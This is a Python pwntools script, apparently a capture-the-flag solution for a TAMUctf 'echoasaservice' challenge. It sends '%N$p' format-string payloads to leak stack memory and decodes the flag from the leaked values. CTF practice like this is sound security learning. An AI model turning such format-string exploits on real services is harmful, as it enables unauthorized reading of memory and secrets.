from pwn import *
import sys

context.clear(arch='amd64', os='linux')

__author__ = 'yuvaly0'

argv = sys.argv
binary_path = './echoasaservice'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('challenges.tamuctf.com', 4251)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main
		''')

e = ELF(binary_path)

# ------------- plan -----------
# use format string to leak the flag

flag = ''
for i in xrange(8, 11):
	sh.sendlineafter('Echo as a service (EaaS)\n', '%{}$p'.format(i))
	flag += sh.recvline()[2:-1].decode('hex')[::-1]

log.success(flag)

# flag = ''
# for i in xrange(10, 7, -1):
# 	sh.sendlineafter('Echo as a service (EaaS)\n', '%{}$p'.format(i))
# 	flag += sh.recvline()[2:-1]

# log.info(flag.decode('hex')[::-1])